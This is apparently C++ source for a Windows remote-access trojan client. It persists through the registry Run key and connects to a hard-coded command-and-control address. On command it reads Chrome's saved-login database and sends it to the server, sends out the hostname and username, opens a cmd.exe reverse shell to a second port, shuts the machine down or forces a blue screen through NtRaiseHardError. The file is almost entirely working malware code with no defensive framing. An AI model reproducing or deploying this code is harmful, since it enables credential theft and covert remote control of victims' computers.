#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <iostream>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <filesystem>
#pragma comment(lib, "ntdll.lib")
#include <fstream>
#include <Lmcons.h>
#include <winnt.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


SOCKET mySocket, mySocket2;
sockaddr_in addr;
WSADATA version;
STARTUPINFO si;
PROCESS_INFORMATION pi;

void shutdown();
void sysinfo();
void dos();
void BOTD();
/*
void upload_file();
void download_file();
*/
void get_login_data();
void goToMain();
int main();

void addToStartup() {
    std::wstring progPath = L"Client.exe";

    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); 
    LONG status = RegSetValueEx(hkey, "Client.exe", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));

    
}
void reverseShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // Five Second


        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket2 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket2, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket2);

            WSACleanup();
            continue;
        }
        else {

            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket2, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket2);
                WSACleanup();
                continue;
            }
            else {
                std::cout << "Reverse Shell Starting" << std::endl;

                char Process[] = "C:\\WINDOWS\\System32\\cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket2;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket2, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket2);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    closesocket(mySocket2);
                    WSACleanup();
                    main();
                }
            
            }

                
           

        }
    }
}
void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // Five Second

       
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
       
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);
     
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
         
            WSACleanup();
            continue;
        }
        else {
            
            char RecvData[1024];
            memset(RecvData, 0, sizeof(RecvData));
         
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            std::cout << "Reverse Shell Starting" << std::endl;
            std::cout << RecvCode << std::endl;
            std::cout << RecvData << std::endl;
            if (strcmp(RecvData, "shutdown") == 0) {
                shutdown();
            }

            if (strcmp(RecvData, "dos") == 0) {
                dos();
            }

            if (strcmp(RecvData, "botd") == 0) {
                BOTD();
            }

            if (strcmp(RecvData, "sysinfo") == 0) {
                sysinfo();
            }

            if (strcmp(RecvData, "loginData") == 0) {
                get_login_data();
            }

            if (strcmp(RecvData, "revShell") == 0) {
                std::cout << "Reverse Shell Starting" << std::endl;
               closesocket(mySocket);
               WSACleanup();
               char host[] = "192.168.178.102";  
               int port = 6666;
               reverseShell(host, port);
            }
            if (RecvCode <= 0) {
                closesocket(mySocket);
               
                WSACleanup();
                continue;
            }
      
            
        }
    }
}

void get_login_data() {

   
    char buffer[1024];
    FILE* fd = fopen("\\%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"
        , "rb");
    size_t rret, wret;
    int bytes_read;
    while (!feof(fd)) {
        if ((bytes_read = fread(&buffer, 1, DEFAULT_BUFLEN, fd)) > 0)
            send(mySocket, buffer, bytes_read, 0);
        else
            break;
    }
    fclose(fd);

}
/*
void upload_file() {




}

void download_file() {


}

*/


void BOTD() {
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); 
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); 
}
int main() {
    /*
        HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    */
    
    char host[] = "192.168.178.102";  
    int port = 4444;    
    addToStartup();
    RunShell(host, port);
  
    return 0;
}

void goToMain() {
    main();
}

void shutdown() {
    system("c:\\windows\\system32\\shutdown /s \n\n");

    main();
}

void sysinfo() {
    
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    char* user = getenv("username");

    char hostname[80];
    gethostname(hostname, sizeof(hostname));

    send(mySocket, hostname, sizeof(hostname), 0);
    send(mySocket, user, sizeof(user), 0);
    main();
}

void dos() {
    main();
}

